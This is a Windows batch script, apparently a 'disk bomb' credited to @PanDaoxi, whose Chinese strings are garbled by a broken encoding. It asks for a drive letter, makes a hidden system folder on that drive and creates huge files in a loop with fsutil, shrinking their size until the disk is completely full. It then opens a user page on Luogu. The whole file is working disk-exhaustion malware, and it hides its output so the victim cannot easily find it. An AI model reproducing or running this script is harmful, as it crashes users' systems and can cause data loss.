@echo off
title ���̱�ը���� By @PanDaoxi
set file=0
set big=100000000000000

:input
set /p Disk=��������Ҫ��ը�Ĵ����̷���
echo.
set %Disk%=%Disk:~0,1%
if not exist "%Disk%:\" (
echo ����̷������ڣ��뻻һ����
goto input)
md "%Disk%:\PanDaoxiYYDS" > nul
attrib +s +h "%Disk%:\PanDaoxiYYDS"

:st
set /a file=%file%+1
echo %file%	����С�����С %big% Byte
fsutil file createnew "%Disk%:\PanDaoxiYYDS\%file%" %big% > nul
if not exist "%Disk%:\PanDaoxiYYDS\%file%" (goto smaller)
goto st

:smaller
if /i "%big%" == "1" goto exi
if /i "%big%" == "10" set big=1
if /i "%big%" == "100" set big=10
if /i "%big%" == "1000" set big=100
if /i "%big%" == "10000" set big=1000
if /i "%big%" == "100000" set big=10000
if /i "%big%" == "1000000" set big=100000
if /i "%big%" == "10000000" set big=1000000
if /i "%big%" == "100000000" set big=10000000
if /i "%big%" == "1000000000" set big=100000000
if /i "%big%" == "10000000000" set big=1000000000
if /i "%big%" == "100000000000" set big=10000000000
if /i "%big%" == "1000000000000" set big=100000000000
if /i "%big%" == "10000000000000" set big=1000000000000
if /i "%big%" == "100000000000000" set big=10000000000000
goto st

:exi
timeout 3
cls
echo �����ɹ�����
echo Copyright 2022 by @PanDaoxi. ��������
pause
start https://www.luogu.com.cn/user/593403